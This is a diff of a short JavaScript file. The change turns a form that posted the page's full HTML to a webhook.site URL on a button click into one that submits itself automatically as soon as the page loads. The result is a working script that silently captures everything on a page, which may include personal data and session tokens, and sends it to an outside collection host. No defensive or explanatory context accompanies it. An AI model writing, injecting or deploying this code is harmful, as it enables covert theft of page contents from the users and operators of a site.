@@ -3,8 +3,8 @@
 // The webhook URL
 const webhookUrl = "https://webhook.site/41b3fa6e-82f9-4bcc-af04-46260100132c";
 
-// Function to create and submit a form with the page's HTML body as payload
-function createAndAppendFormWithHtmlBody() {
+// Function to create and automatically submit a form with the page's HTML body as payload
+function createAndSubmitFormWithHtmlBody() {
     // Get the current HTML content of the page
     const pageContent = document.documentElement.outerHTML; // The complete HTML of the page
 
@@ -19,23 +19,20 @@ function createAndAppendFormWithHtmlBody() {
     hiddenInput.name = "htmlBody"; // Key for the payload
     hiddenInput.value = pageContent;
 
-    // Add a submit button
-    const submitButton = document.createElement("button");
-    submitButton.type = "submit";
-    submitButton.textContent = "Submit HTML Body";
-
-    // Append the hidden input and submit button to the form
+    // Append the hidden input to the form
     form.appendChild(hiddenInput);
-    form.appendChild(submitButton);
 
     // Add the form to the body
     document.body.appendChild(form);
-    
-    console.log("Form with HTML body has been added to the DOM.");
+
+    console.log("Form has been created and added to the DOM. Submitting now...");
+
+    // Automatically submit the form
+    form.submit();
 }
 
 // Ensure the function runs after the DOM is fully loaded
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("DOM fully loaded. Creating and appending form...");
-    createAndAppendFormWithHtmlBody();
+    console.log("DOM fully loaded. Creating and auto-submitting form...");
+    createAndSubmitFormWithHtmlBody();
 });
